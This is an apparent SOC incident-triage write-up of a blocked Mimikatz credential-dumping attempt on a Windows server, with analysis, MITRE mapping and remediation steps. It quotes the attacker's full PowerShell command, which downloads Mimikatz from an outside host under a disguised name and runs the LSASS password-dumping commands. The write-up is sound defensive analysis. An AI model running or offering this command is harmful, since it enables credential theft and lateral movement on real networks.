Alert: Mimikatz credential theft tool

Endpoint: ec2amaz-9oh9aqq

User: NT AUTHORITY\SYSTEM

OS: WindowsServer2022

Verdict: True positive

Command Line:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -ExecutionPolicy
Bypass -C md "$env:TEMP\svcdiag" -f | Out-Null; (New-Object
Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-
20220919/mimikatz_trunk.zip',"$env:TEMP\svcdiag\kb97413.zip"); Expand-Archive
"$env:TEMP\svcdiag\kb97413.zip" "$env:TEMP\svcdiag" -f; &
"$env:TEMP\svcdiag\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit

Why was the alert triggered?

Mimikatz named malware detected

What was the Threat Actor trying to do?

The attacker is trying to harvest credentials to log into this or other devices on the network, by
impersonating a valid user.

Why did the Threat Actor run those commands/malware?

After PowerShell downloaded and extracted Mimikatz, threat actor executed mimikatz.exe with
the arguments privilege::debug and sekurlsa::logonpasswords. These are Mimikatz
commands that request debug privileges and then attempt to retrieve authentication material from
the LSASS process. This behavior aligns with MITRE ATT&CK technique T1003.001 (LSASS Credential
Dumping), which is why Defender generated a Credential Access alert.

Did it execute successfully?

Defender prevented execution of HackTool:Win32/Mimikatz.I

Is it malicious or a false positive?

It is malicious.

Remediation:

Isolated the device ec2amaz-9oh9aqq

•
•  Terminated the processes for wusvc.exe (PID 6176) and nssm.exe (PID 6280).
•  Deleted the files at C:\Users\Public\wusvc.exe and the temp files in

C:\Windows\Temp\nssm\.

Escalation to Service Team:

Firewall Containment:

Action: Block traffic to/from IP address 172.31.2.203 on the perimeter and internal network
firewalls.

Objective: Prevent any host on the network from communicating with this suspected attacker/C2
server.

Credential Reset & Hardening:

Action: Force a mandatory password reset for all local and domain Administrator accounts
associated with the impacted server.

Objective: Ensure no compromised memory-cached credentials can be leveraged for post-
exploitation lateral movement.

